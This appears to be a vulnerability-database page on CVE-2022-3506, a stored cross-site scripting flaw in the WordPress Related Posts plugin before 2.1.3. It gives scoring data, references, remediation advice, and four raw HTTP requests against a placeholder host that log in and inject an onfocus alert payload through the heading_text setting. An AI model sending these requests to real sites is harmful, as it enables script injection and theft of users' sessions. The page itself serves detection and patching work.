---
layout: "post"
cve_id: "CVE-2022-3506"
title: "WordPress Related Posts <2.1.3 - Stored Cross-Site Scripting"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-3506.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-3506.yaml"
author: "arafatansari"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into the website, potentially leading to unauthorized access, data theft, or defacement.
"
remediation: "Update to the latest version of the WordPress Related Posts plugin (2.1.3 or higher) to mitigate the vulnerability.
"
reference:
  - "https://huntr.dev/bounties/08251542-88f6-4264-9074-a89984034828/"
  - "https://huntr.dev/bounties/08251542-88f6-4264-9074-a89984034828"
  - "https://github.com/barrykooij/related-posts-for-wp/commit/37733398dd88863fc0bdb3d6d378598429fd0b81"
  - "https://nvd.nist.gov/vuln/detail/CVE-2022-3506"
  - "https://github.com/ARPSyndicate/cvemon"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N', 'cvss-score': 5.4, 'cve-id': 'CVE-2022-3506', 'cwe-id': 'CWE-79', 'epss-score': 0.01295, 'epss-percentile': 0.79254, 'cpe': 'cpe:2.3:a:never5:related_posts:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'verified': True, 'max-request': 4, 'vendor': 'never5', 'product': 'related_posts', 'framework': 'wordpress'}"
tags:
  - "cve2022"
  - "cve"
  - "wordpress"
  - "wp"
  - "wp-plugin"
  - "relatedposts"
  - "xss"
  - "authenticated"
  - "huntr"
  - "never5"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
WordPress Related Posts plugin prior to 2.1.3 contains a cross-site scripting vulnerability in the rp4wp[heading_text] parameter. User input is not properly sanitized, allowing the insertion of arbitrary code that  can allow an attacker to steal cookie-based authentication credentials and launch other attacks.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.16
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=4Y8SpG&pwd=Gb4X5t&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/options-general.php?page=rp4wp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/options.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363
Connection: close
Content-Length: 777
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

option_page=rp4wp&action=update&_wpnonce=rSa9O4&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Drp4wp&rp4wp%5Bautomatic_linking%5D=1&rp4wp%5Bautomatic_linking_post_amount%5D=3&rp4wp%5Bheading_text%5D=%22+autofocus+onfocus%3Dalert%28document.domain%29%3E&rp4wp%5Bexcerpt_length%5D=15&rp4wp%5Bcss%5D=.rp4wp-related-posts+ul%7Bwidth%3A100%25%3Bpadding%3A0%3Bmargin%3A0%3Bfloat%3Aleft%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%7Blist-style%3Anone%3Bpadding%3A0%3Bmargin%3A0%3Bpadding-bottom%3A20px%3Bclear%3Aboth%3B%7D%0D%0A.rp4wp-related-posts+ul%3Eli%3Ep%7Bmargin%3A0%3Bpadding%3A0%3B%7D%0D%0A.rp4wp-related-post-image%7Bwidth%3A35%25%3Bpadding-right%3A25px%3B-moz-box-sizing%3Aborder-box%3B-webkit-box-sizing%3Aborder-box%3Bbox-sizing%3Aborder-box%3Bfloat%3Aleft%3B%7D
```

```nohighlight
GET /wp-admin/options-general.php?page=rp4wp&settings-updated=true HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

